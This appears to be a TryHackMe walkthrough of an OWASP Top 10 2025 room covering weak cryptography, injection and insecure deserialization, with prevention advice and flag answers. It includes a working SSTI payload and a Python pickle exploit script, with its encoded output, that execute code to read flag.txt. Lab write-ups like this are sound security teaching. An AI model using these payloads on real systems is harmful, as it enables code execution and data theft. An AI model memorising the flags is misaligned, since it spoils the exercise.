
TryHackMe Walkthrough
OWASP Top 10 2025
========================================================

Title: OWASP Top 10 2025 – Insecure Data Handling
Platform: TryHackMe
Category: Web Security / OWASP
Difficulty: Easy

--------------------------------------------------------
2. A04: Cryptographic Failures
--------------------------------------------------------

### What are Cryptographic Failures?

Cryptographic failures occur when sensitive data is not adequately protected.
This can happen due to missing encryption, weak or outdated algorithms, faulty
implementations, or poor key management.

Common examples include:
- Storing passwords without hashing
- Using weak or deprecated cryptographic algorithms
- Exposing encryption keys in source code or repositories
- Failing to encrypt data during transmission

### How to Prevent Cryptographic Failures

To prevent cryptographic failures, applications should:
- Use strong, modern cryptographic algorithms
- Hash sensitive information instead of storing it in plaintext
- Use slow hashing functions such as:
  - bcrypt
  - scrypt
  - Argon2
- Never create custom cryptographic algorithms
- Rely on trusted, industry-standard libraries
- Never embed access credentials or encryption keys in source code or repositories

### Practical Exercise

The practical provides an encrypted set of notes.

Hint:
The key is: `key1`

#### Question

Decrypt the encrypted notes. One of them contains a flag value.

#### Answer

```
thm{weak_crypto_flag}
```

--------------------------------------------------------
3. A05: Injection
--------------------------------------------------------

### What is Injection?

Injection vulnerabilities occur when an application takes user input and
mishandles it by passing it directly into an interpreter or execution context.

Instead of being treated as data, the input is executed as commands or queries
by systems such as:
- Databases
- Operating systems
- Template engines
- APIs

### Common Types of Injection

- SQL Injection
- Command Injection
- Server-Side Template Injection (SSTI)
- AI Prompt Injection

### How to Prevent Injection

Preventing injection attacks requires treating all user input as untrusted.

Best practices include:
- Using prepared statements and parameterised queries for SQL
- Avoiding functions that directly pass input to the system shell
- Using safe APIs that do not invoke the shell
- Validating input types and enforcing strict schemas
- Escaping dangerous characters
- Sanitising input before processing

### Practical Exercise (SSTI)

The application is vulnerable to Server-Side Template Injection.

#### Payload Used

```
{{request.application.__globals__.__builtins__.open('flag.txt').read()}}
```

#### Question

Perform an SSTI attack to read the contents of `flag.txt`.

#### Answer

```
THM{SSTI_FLAG_OBTAINED}
```

--------------------------------------------------------
4. A08: Software or Data Integrity Failures
--------------------------------------------------------

### What Are Software or Data Integrity Failures?

Software or Data Integrity Failures occur when an application trusts code,
updates, or data without verifying their authenticity or integrity.

Examples include:
- Trusting software updates without verification
- Loading configuration files from untrusted sources
- Accepting serialized objects without validation
- Failing to verify the origin of scripts, binaries, or JSON data

### Practical Exercise – Insecure Deserialization

In this exercise, a Python application accepts serialized data without proper
validation, making it vulnerable to insecure deserialization.

### Malicious Payload Creation

The following Python code is used to create a malicious serialized payload
that reads the contents of `flag.txt`:

```python
import pickle
import base64

class Malicious:
    def __reduce__(self):
        return (eval, ("open('flag.txt').read()",))

payload = pickle.dumps(Malicious())
encoded = base64.b64encode(payload).decode()
print(encoded)
```

### Generated Payload

```
gASVMwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwXb3BlbignZmxhZy50eHQnKS5yZWFkKCmUhZRSlC4=
```

This payload is pasted into the application's input field.

#### Question

What are the contents of `flag.txt`?

#### Answer

```
THM{INSECURE_DESERIALIZATION}
```

--------------------------------------------------------
Conclusion
--------------------------------------------------------

This room highlights several critical OWASP Top 10 risks, including weak
cryptography, injection vulnerabilities, and insecure deserialization.

Understanding these issues and applying secure coding practices is essential
to building resilient and secure applications.
========================================================
